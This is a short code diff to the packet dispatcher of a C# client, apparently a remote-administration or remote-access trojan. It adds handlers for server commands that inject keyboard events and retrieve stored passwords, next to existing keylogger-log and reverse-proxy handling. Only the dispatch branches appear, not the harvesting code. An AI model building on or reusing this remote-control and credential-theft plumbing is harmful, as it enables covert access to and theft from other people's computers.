@@ -71,6 +71,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDoMouseEvent((ServerPackets.DoMouseEvent)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoKeyboardEvent))
+            {
+                CommandHandler.HandleDoKeyboardEvent((ServerPackets.DoKeyboardEvent)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetSystemInfo))
             {
                 CommandHandler.HandleGetSystemInfo((ServerPackets.GetSystemInfo)packet, client);
@@ -127,6 +131,10 @@ namespace xClient.Core.Packets
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
+            }
+            else if (type == typeof(ServerPackets.GetPasswords))
+            {
+                CommandHandler.HandleGetPasswords((ServerPackets.GetPasswords)packet, client);
             }
             else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnect) ||
                      type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
